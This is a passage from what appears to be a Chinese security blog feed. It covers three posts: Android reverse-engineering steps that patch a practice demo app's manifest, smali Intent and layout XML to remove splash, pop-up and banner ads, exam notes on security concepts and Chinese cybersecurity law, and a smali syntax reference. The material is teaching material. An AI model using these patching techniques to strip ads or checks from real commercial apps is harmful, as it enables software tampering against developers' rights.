class="tag">        <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="comment">&lt;!--当前Activity是否可以被另一个Application的组件启动：true允许被启动；false不允许被启动--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!---指明这个activity可以以什么样的意图(intent)启动---&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--表示activity作为一个什么动作启动，android.intent.action.MAIN表示作为主activity启动---&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--这是action元素的额外类别信息，android.intent.category.LAUNCHER表示这个activity为当前应用程序优先级最高的Activity--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>因此我们可以直接把<code>com.zj.wuaipojie.ui.AdActivity</code>替换成我们想加载的页面即可<code>com.zj.wuaipojie.ui.ChallengeThird</code>。</p><h3 id="修改跳转的类">修改跳转的类</h3><p>实际上这个也是跟上面一种方法一样是属于<code>Activity切换定位，修改Intent的Activity类名称</code>这一类方法中的。</p><p>这次我们是通过修改smali代码来实现，首先我们要找到跳转的逻辑位置，先通过<code>com.zj.wuaipojie.ui.AdActivity</code>找到这个类在smali代码中的全程<code>Lcom/zj/wuaipojie/ui/AdActivity</code></p><img src="https://image.icewindy.cn/2025/07/324aedd027335233755ecfdc2cfe0411.png" alt="image-20250723201304891" style="zoom:33%;" /><p>然后再通过这个在代码中搜索</p><img src="https://image.icewindy.cn/2025/07/357b4036566e4374c76cf29dee75cdf2.png" alt="image-20250723201402801" style="zoom:50%;" /><img src="https://image.icewindy.cn/2025/07/c17e9231af32658d1e27b474c90b9854.png" alt="image-20250723201440163" style="zoom:50%;" /><p>我们跳转到这个代码处，先将代码转换为Java代码让我们更易看懂</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ChallengeAdapter</span> <span class="keyword">extends</span> <span class="title class_">Adapter</span>&lt;ViewHolder&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;Challenge&gt; mChallenges;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: onCreateViewHolder$lambda-0 */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> m0onCreateViewHolder$lambda-<span class="number">0</span>(ViewHolder viewHolder, View view) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">adapterPosition</span> <span class="operator">=</span> viewHolder.getAdapterPosition();</span><br><span class="line">        Intent intent;</span><br><span class="line">        <span class="keyword">if</span> (adapterPosition == <span class="number">0</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeFirst.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">1</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeSecond.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">2</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>(); <span class="comment">//创建一个intent</span></span><br><span class="line">            intent.setClass(view.getContext(), AdActivity.class); <span class="comment">//传入要切换Activity的类名</span></span><br><span class="line">            view.getContext().startActivity(intent); <span class="comment">//启动对应的Activity</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">3</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeFourth.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">4</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeFifth.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (adapterPosition == <span class="number">5</span>) &#123;</span><br><span class="line">            intent = <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">            intent.setClass(view.getContext(), ChallengeSixth.class);</span><br><span class="line">            view.getContext().startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过这个代码我们就可以看到这个切换的方法，我们通过修改他smali代码，可以实现跳过广告的效果</p><img src="https://image.icewindy.cn/2025/07/f6502d08173b2cae3add149e3ac34d72.png" alt="image-20250723202041114" style="zoom:67%;" /><p>我们来看看效果</p><img src="https://image.icewindy.cn/2025/07/c5d288b3f659f16e49038ef311f145e9.png" alt="image-20250723202125844" style="zoom:33%;" /><p>可以看到我们已经把开屏广告给干掉了。</p><h3 id="activity生命周期">Activity生命周期</h3><table><thead><tr><th>函数名称</th><th>描述</th></tr></thead><tbody><tr><td>onCreate()</td><td>一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td></tr><tr><td>onStart()</td><td>当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td></tr><tr><td>onResume()</td><td>这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td></tr><tr><td>onPause()</td><td>这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td></tr><tr><td>onStop()</td><td>这个方法是在Activity完全不可见的时候调用的。</td></tr><tr><td>onDestroy()</td><td>这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td></tr><tr><td>onRestart()</td><td>当Activity从停止stop状态恢进入start状态时调用状态。</td></tr></tbody></table><img src="https://image.icewindy.cn/2025/07/e771d223f6db415cd85a6929cf371628.png" style="zoom:50%;" /><h2 id="弹窗定位-堆栈分析">弹窗定位&amp;堆栈分析</h2><p>对于弹窗广告我们有以下几种修改方法：</p><ul><li>修改xml中的versioncode（用于跳过版本检查）</li><li>Hook弹窗（使用算法助手Pro开启弹窗定位）</li><li>修改dex弹窗代码（通过算法助手Pro日志分析堆栈找到方法名）</li><li>抓包修改响应体</li></ul><h3 id="hook弹窗">Hook弹窗</h3><p>这里我们使用到的是算法助手Pro这个模块，选择弹窗定位</p><img src="https://image.icewindy.cn/2025/07/1bbb07bf143607908ea600c92486745b.png" alt="image-20250724202631917" style="zoom: 33%;" /><p>打开后，我们注入教程demo，弹窗出现的地方，我们直接按两下返回键，即可关闭弹窗</p><img src="https://image.icewindy.cn/2025/07/0a067bbfec3a1beb7f0e7f804aef53e0.png" alt="image-20250724202743154" style="zoom: 33%;" /><h3 id="修改dex弹窗代码">修改dex弹窗代码</h3><p>在我们上一个方法中，我们Hook了弹窗，因此我们可以在算法助手Pro的日志中找到创建弹窗的方法名：</p><ul><li>com.zj.wuaipojie.ui.ChallengeThird.onCreate</li></ul><img src="https://image.icewindy.cn/2025/07/c6022351bfed744176e99e386fde4623.png" alt="image-20250724203139902" style="zoom:33%;" /><p>接着我们用这个方法名，在Dex编辑中定位到对应的方法</p><img src="https://image.icewindy.cn/2025/07/dccf654543cd8fd3dc22324a0edeea83.png" alt="image-20250724203941845" style="zoom:33%;" /><p>像这一种弹窗最后都会调用show()方法来显示出弹窗的信息，我们只要把这一段代码注释掉即可，我们这里两个弹窗都在这个方法里面，我们把两个show()方法注释掉即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.line <span class="number">38</span></span><br><span class="line">#invoke-virtual &#123;p1&#125;, Landroidx/appcompat/app/AlertDialog$Builder;-&gt;show()Landroidx/appcompat/app/AlertDialog;</span><br><span class="line">    </span><br><span class="line">.line <span class="number">53</span></span><br><span class="line">#invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/util/CommonDialog;-&gt;show()V</span><br></pre></td></tr></table></figure><p>重新编译签名安装，我们的弹窗就被去掉了。</p><h2 id="布局优化">布局优化</h2><p>接下来我们发现，里面的横幅广告挡住了我们内容，我们想将它去掉。</p><p>我们可以用到开发助手帮助查看我们的布局</p><img src="https://image.icewindy.cn/2025/07/33a71d559f6531ad5592fa369b39a9b0.png" alt="image-20250724204722732" style="zoom:33%;" /><p>我们点击第一个进去，找到它的id<code>0x7f0801ca</code>，我们使用np管理器的xml搜索功能查找资源ID（将0x去掉再搜索）。</p><p>定位到一个叫<code>jJ.xml</code>的文件，点击编辑进入xml文件，直接搜索id（右上角关掉id转名称）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:id</span>=<span class="string">&quot;@7F0801CA&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:background</span>=<span class="string">&quot;@7F0D0017&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_height</span>=<span class="string">&quot;150.0dip&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;100.0dip&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>这边有两种改法：</p><ol><li><p>把宽度或者高度设置为0</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:id</span>=<span class="string">&quot;@7F0801CA&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:background</span>=<span class="string">&quot;@7F0D0017&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_width</span>=<span class="string">&quot;0dip&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_height</span>=<span class="string">&quot;0dip&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;100.0dip&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>使用visibility属性隐藏起来</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:id</span>=<span class="string">&quot;@7F0801CA&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:background</span>=<span class="string">&quot;@7F0D0017&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_height</span>=<span class="string">&quot;150.0dip&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:layout_marginTop</span>=<span class="string">&quot;100.0dip&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">android:visibility</span>=<span class="string">&quot;gone&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>通过修改xml的方法我们可以把横幅广告隐藏起来。</p>]]></content>
      
      
      <categories>
          
          <category> 移动安全 </category>
          
          <category> Android逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全工程师软考（1）:网络信息安全基础、管理、法律法规</title>
      <link href="/2025/07/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%881%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E3%80%81%E7%AE%A1%E7%90%86%E3%80%81%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/"/>
      <url>/2025/07/21/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E8%BD%AF%E8%80%83%EF%BC%881%EF%BC%89%EF%BC%9A%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E3%80%81%E7%AE%A1%E7%90%86%E3%80%81%E6%B3%95%E5%BE%8B%E6%B3%95%E8%A7%84/</url>
      
        <content type="html"><![CDATA[<h2 id="网络安全基础">网络安全基础</h2><h3 id="网络安全基本概念">网络安全基本概念</h3><ul><li>信息化社会的主要特征：<strong>数字化、网络化、智能化</strong></li><li>网络信息安全（狭义）：<strong>机密性、完整性、可用性</strong>、抗抵赖性、可控性</li><li>网络信息安全（广义）：国家安全、城市安全、经济安全、社会安全、生产安全、人身安全</li></ul><h4 id="网络安全三大发展趋势">网络安全三大发展趋势</h4><ul><li>对象内容：从单维度转向多维度，包含网络空间域、物理空间域、社会空间域；</li><li>理念方法：从单一性（技术）向综合性（法律、政策、技术、管理、产业、教育）；</li><li>持续时间：要求覆盖网络系统的整个生命周期，响应速度要求不断缩短。</li></ul><h4 id="12大问题">12大问题</h4><ul><li>网络强依赖性及关联风险</li><li>供应链与安全质量风险（如美国对华为芯片断供）</li><li>技术同质性与滥用风险（避免单一供应商风险）</li><li>网络安全建设与管理发展不平衡、不充分（建设与管理同等重要）</li><li>网络数据安全风险</li><li>高级持续威胁风险</li><li>恶意代码风险</li><li>软件漏洞风险</li><li>人员安全意识风险</li><li>技术复杂性和运营风险</li><li>地下黑产经济风险</li><li>网络间谍与网络战风险</li></ul><h3 id="网络信息安全的基本属性-cia特性是重点">网络信息安全的基本属性（CIA特性是重点）</h3><table><thead><tr><th>属性</th><th>定义</th><th>攻击与防范</th></tr></thead><tbody><tr><td><strong>机密性（Confidentiality）</strong></td><td>防止非授权用户获取信息（读）</td><td>窃听-加密</td></tr><tr><td><strong>完整性（Integrity）</strong></td><td>防止未授权更改（写）</td><td>修改-HASH/签名</td></tr><tr><td><strong>可用性（Availablity）</strong></td><td>合法授权用户能及时获取网络信息和服务的特性</td><td>DOS/DDOS-设备冗余/流量清洗</td></tr><tr><td>抗抵赖性（Non-Repudiation）</td><td>防止用户否认其活动行为（干了但是说自己没干）</td><td>数字签名</td></tr><tr><td>可控性</td><td>责任主体对系统具有管理、支配能力（可以控制系统）</td><td></td></tr><tr><td>其他特性</td><td>真实性、时效性、合规性、公平性、可靠性、可生存性、隐私性</td><td></td></tr></tbody></table><h3 id="信息安全目标与功能">信息安全目标与功能</h3><ul><li>宏观目标：<strong>满足国家安全需求特性</strong>，<strong>符合国家法律法规政策要求</strong>，如网络主权、网络合规（等保2.0等）</li><li>微观目标：<strong>网络信息系统的具体安全要求</strong>（CIA）</li><li>具体目标：防御网络安全威胁、保障业务持续运营、保护数据安全</li><li>基本功能：<strong>防御、监测、应急、恢复</strong></li></ul><h3 id="信息安全技术需求">信息安全技术需求</h3><ul><li>物理环境安全（环境、设备、存储介质）</li><li>认证（防止用户假冒身份访问网络资源）</li><li>访问控制</li><li>网络安全保密</li><li>漏洞扫描</li><li>恶意代码防护（木马、蠕虫）</li><li>内容安全（淫秽色情、反动信息）</li><li>安全监测与预警（入侵监测、态势感知、言论监测）</li><li>应急响应</li></ul><h2 id="网络信息安全管理">网络信息安全管理</h2><h3 id="内容">内容</h3><h4 id="定义">定义</h4><ul><li>核心特性：确保网络资产的<strong>可用性、完整性、可控性和抗抵赖性</strong>等</li><li>实施方式：通过对网络资产采取<strong>合适的安全措施</strong>来实现</li></ul><h4 id="涉及内容">涉及内容</h4><ul><li><strong>物理安全</strong>：机房选址要避开地下室等易受水淹区域</li><li><strong>网络通信安全</strong>：通过加密保证数据传输安全，如A和B远程通信时防止第三方窃取</li><li><strong>操作系统安全</strong>：涉及国产化操作系统等自主可控方案</li><li><strong>网络服务安全</strong>：防范针对Web、FTP等服务的攻击</li><li><strong>网络操作安全</strong>：防止恶意操作如&quot;删库跑路&quot;等数据破坏行为</li><li><strong>人员安全</strong>：通过培训、考试、规章制度提升安全意识</li></ul><h4 id="管理方法">管理方法</h4><p>主要有风险管理、等级保护、纵深防御、层次化保护、应急响应、<strong>PDCA方法</strong>等。</p><p><strong>PDCA：</strong></p><ul><li>计划（Plan）-&gt;执行（Do）-&gt;检查（Check）-&gt;整改（Act）</li><li>行程持续改进的良性循环，常在项目管理中考察</li></ul><h4 id="管理工具">管理工具</h4><p>SOC（安全操作中心/安全管理中心）、IT资产管理系统、态势感知系统（通过分析全网日志和流量监测安全态势）、漏扫、协议分析器、上网行为管理等</p><h4 id="安全评估">安全评估</h4><p>有三套标准：</p><ul><li>等保评测：通过<strong>技术+管理</strong>综合评估</li><li>信息安全管理体系认证（ISMS）：通过<strong>应用风险管理</strong>保持信息的保密性、完整性、可用性</li><li>系统安全工程能力成熟度模型（SSE-CMM）：通过<strong>组织过程、工程过程、项目过程</strong>等评估系统安全能力</li></ul><p>考察三套标准区分，即划重点的位置。</p><h3 id="要素">要素</h3><p>网络信息安全管理要素由<strong>网络管理对象、网络威胁、网络脆弱性、网络风险、网络保护措施</strong>组成（五个要素需要记忆）</p><ul><li>管理对象：硬件、软件、存储介质、网络信息资产、支持保障系统</li><li>安全威胁：<ul><li>自然威胁：地震、雷击、洪水等s</li><li>人为威胁：物理安全威胁、网络通信威胁、网络服务威胁、网络管理威胁</li></ul></li><li>脆弱性：系统中与安全策略冲突的状态或错误，如弱密码&quot;123456&quot;</li><li><strong>风险控制措施（需要记忆）</strong>：<ul><li><strong>避免风险</strong>：物理隔离内外网</li><li><strong>转移风险</strong>：购买商业保险或安全外包**（重点考点）**</li><li><strong>减少威胁</strong>：安装防病毒软件</li><li><strong>消除脆弱点</strong>：打补丁或强化安全意识</li><li><strong>减少威胁影响</strong>：多链路备份或应急预案</li><li><strong>风险监测</strong>：定期安全状态风险分析</li></ul></li></ul><h3 id="管理流程">管理流程</h3><ul><li><strong>确定管理对象</strong>：明确要管理的具体目标（如Web服务器、交换机等）</li><li><strong>评估对象价值</strong>：判断管理对象的经济价值（例如10万或2000元的对象管理级别不同）</li><li><strong>识别威胁</strong>：分析可能面临的攻击类型（如SQL注入、XSS、DDoS等）</li><li><strong>识别脆弱性</strong>：找出最典型的安全弱点（如Web系统的SQL注入漏洞）</li><li><strong>确定风险级别</strong>：评估风险等级</li><li><strong>制定防范措施</strong>：根据风险级别选择适当防护方案</li><li><strong>实施落实措施</strong>：具体落实防范措施</li><li><strong>运行/维护</strong>：持续运行维护安全设备和配置</li></ul><p><strong>考试重点</strong>：</p><ul><li>可能要求对流程步骤进行排序</li><li>可能考察特定步骤后的下一步操作</li><li>开放性问题可参考风险控制措施作答</li></ul><h2 id="网络安全法律法规">网络安全法律法规</h2><h3 id="关键法律实施时间">关键法律实施时间</h3><ul><li>《中华人民共和国国家安全法》：<strong>2015年7月1日</strong>通过并实施（考试高频考点）</li><li><strong>《中华人民共和国网络安全法》（重点）</strong>：<strong>2017年6月1日</strong>实施（记忆口诀：儿童节实施，比2018年股灾早一年）<ul><li><strong>责任制度</strong>：单位一把手负责制，需明确网络安全责任人</li><li><strong>技术措施</strong>：需部署防病毒、防入侵设备等</li><li><strong>日志留存</strong>：网络日志必须保留至少6个月（2021年网规考试原题考点）</li><li><strong>数据保护</strong>：需实施分类、备份和加密措施</li></ul></li><li>《网络安全等级保护2.0》：<strong>2019年12月1日</strong>实施</li><li>《中华人民共和国密码法》：<strong>2020年1月1日</strong>实施</li><li>《中华人民共和国数据安全法》：<strong>2021年9月1日</strong>实施</li></ul><p>案例：2021年7月份对滴滴等企业的审查使用了哪两部法律：<strong>国家安全法和网络安全法（数据安全法未实施）</strong></p><h3 id="网络产品和服务安全审查办法">网络产品和服务安全审查办法</h3><p><strong>法律依据</strong>：基于**《国家安全法》<strong>和</strong>《网络安全法》**制定</p><p><strong>审查重点</strong>：</p><ul><li>关键信息基础设施被控风险</li><li>数据泄露/毁损风险</li><li>供应链中断风险（含政治因素）</li><li>合规性审查（如滴滴案例）</li></ul><p><strong>中国网络安全审查技术与认证中心</strong>（CCRC，原中国信息安全认证中心）是负责<strong>实施网络安全审查和认证</strong>的专门机构。</p><p><strong>拓展</strong>：企业采购需提供&quot;安全三证&quot;：</p><ul><li>安全产品：CCRC认证证书</li><li>网络设备：入网许可证</li><li>无线设备：无线电安全委员会核准证</li></ul><h3 id="国家密码管理制度">国家密码管理制度</h3><p><img src="https://image.icewindy.cn/2025/07/90d075f6502b42b65318d053c082ef32.png" alt="image-20250721164751473"></p><p><strong>核心法规</strong>：《密码法》2020.1.1</p><h3 id="网络安全等级保护">网络安全等级保护</h3><ul><li><strong>定级</strong>：专家评审确定级别，等级分有5个级别，常见是2、3级，少有4级。</li><li><strong>备案</strong>：公安机关网安部门备案</li><li><strong>建设整改</strong>：差距分析→安全建设（设备采购占主要成本）</li><li><strong>等级测评</strong>：第三方机构出具测评报告</li><li><strong>运营运维</strong>：持续监管（相关部门监督管理）</li></ul><h3 id="网络信息安全部门">网络信息安全部门</h3><ul><li><strong>核心部门</strong>：<ul><li>网信办（实际管理核心）</li><li>公安网安（等保备案）</li><li>保密局（涉密系统）</li></ul></li><li><strong>技术部门</strong>：<ul><li>CNCERT、CNCERT/CC：国家计算机网络应急技术处理协调中心（24小时事件响应）</li><li>CCRC：产品认证机构</li></ul></li></ul><p>网络信息安全科技信息获取来源：网络安全会议、网络安全期刊、网络安全网站、网络安全术语等。</p><p>网络信息安全领域四大顶刊：S&amp;P，CCS，NDSS，USENIX Security</p><h3 id="网络信息安全术语">网络信息安全术语</h3><p><img src="https://image.icewindy.cn/2025/07/99d4aa89aaee0e02fc0422a7695d5fe1.png" alt="image-20250721165735962"></p><p><strong>考试要点</strong>：选择题英文完形填空</p>]]></content>
      
      
      <categories>
          
          <category> 软考 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android逆向（2）：smali基础</title>
      <link href="/2025/07/21/Android%E9%80%86%E5%90%91%EF%BC%882%EF%BC%89%EF%BC%9Asmali%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/07/21/Android%E9%80%86%E5%90%91%EF%BC%882%EF%BC%89%EF%BC%9Asmali%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="jvm-dalvik-art">JVM、Dalvik、ART</h2><ul><li>JVM是Java虚拟机，运行Java字节码程序</li><li>Dalvik是Android专属的虚拟机，有专属的文件执行格式DEX（Dalvik executable）</li><li>ART(Android Runtime)是Dalvik的升级版</li></ul><h2 id="smali基础语法">smali基础语法</h2><p>smali是Dalvik的寄存器语言，smali代码是dex反编译得到的。</p><h3 id="常见关键词">常见关键词</h3><table><thead><tr><th style="text-align:left">名称</th><th style="text-align:left">注释</th></tr></thead><tbody><tr><td style="text-align:left">.class</td><td style="text-align:left">类名</td></tr><tr><td style="text-align:left">.super</td><td style="text-align:left">父类名，继承的上级类名名称</td></tr><tr><td style="text-align:left">.source</td><td style="text-align:left">源名</td></tr><tr><td style="text-align:left">.field</td><td style="text-align:left">变量</td></tr><tr><td style="text-align:left">.method</td><td style="text-align:left">方法名</td></tr><tr><td style="text-align:left">.register</td><td style="text-align:left">寄存器</td></tr><tr><td style="text-align:left">.end method</td><td style="text-align:left">方法名的结束</td></tr><tr><td style="text-align:left">public</td><td style="text-align:left">公有</td></tr><tr><td style="text-align:left">protected</td><td style="text-align:left">半公开，只有同一家人才能用</td></tr><tr><td style="text-align:left">private</td><td style="text-align:left">私有，只能自己使用</td></tr><tr><td style="text-align:left">.parameter</td><td style="text-align:left">方法参数</td></tr><tr><td style="text-align:left">.prologue</td><td style="text-align:left">方法开始</td></tr><tr><td style="text-align:left">.line xxx</td><td style="text-align:left">位于第xxx行</td></tr></tbody></table><h3 id="常见数据类型">常见数据类型</h3><table><thead><tr><th style="text-align:left">smali类型</th><th style="text-align:left">java类型</th><th style="text-align:left">注释</th></tr></thead><tbody><tr><td style="text-align:left">V</td><td style="text-align:left">void</td><td style="text-align:left">无返回值</td></tr><tr><td style="text-align:left">Z</td><td style="text-align:left">boolean</td><td style="text-align:left">布尔值类型，返回0或1</td></tr><tr><td style="text-align:left">B</td><td style="text-align:left">byte</td><td style="text-align:left">字节类型，返回字节</td></tr><tr><td style="text-align:left">S</td><td style="text-align:left">short</td><td style="text-align:left">短整数类型，返回数字</td></tr><tr><td style="text-align:left">C</td><td style="text-align:left">char</td><td style="text-align:left">字符类型，返回字符</td></tr><tr><td style="text-align:left">I</td><td style="text-align:left">int</td><td style="text-align:left">整数类型，返回数字</td></tr><tr><td style="text-align:left">J</td><td style="text-align:left">long （64位 需要2个寄存器存储）</td><td style="text-align:left">长整数类型，返回数字</td></tr><tr><td style="text-align:left">F</td><td style="text-align:left">float</td><td style="text-align:left">单浮点类型，返回数字</td></tr><tr><td style="text-align:left">D</td><td style="text-align:left">double （64位 需要2个寄存器存储）</td><td style="text-align:left">双浮点类型，返回数字</td></tr><tr><td style="text-align:left">string</td><td style="text-align:left">String</td><td style="text-align:left">文本类型，返回字符串</td></tr><tr><td style="text-align:left">Lxxx/xxx/xxx</td><td style="text-align:left">object</td><td style="text-align:left">对象类型，返回对象</td></tr></tbody></table><h3 id="常用指令">常用指令</h3><table><thead><tr><th style="text-align:left">关键字</th><th style="text-align:left">注释</th></tr></thead><tbody><tr><td style="text-align:left">const</td><td style="text-align:left">重写整数属性，真假属性内容，只能是数字类型</td></tr><tr><td style="text-align:left">const-string</td><td style="text-align:left">重写字符串内容</td></tr><tr><td style="text-align:left">const-wide</td><td style="text-align:left">重写长整数类型，多用于修改到期时间。</td></tr><tr><td style="text-align:left">return</td><td style="text-align:left">返回指令</td></tr><tr><td style="text-align:left">if-eq</td><td style="text-align:left">全称equal(a=b)，比较寄存器ab内容，相同则跳</td></tr><tr><td style="text-align:left">if-ne</td><td style="text-align:left">全称not equal(a!=b)，ab内容不相同则跳</td></tr><tr><td style="text-align:left">if-eqz</td><td style="text-align:left">全称equal 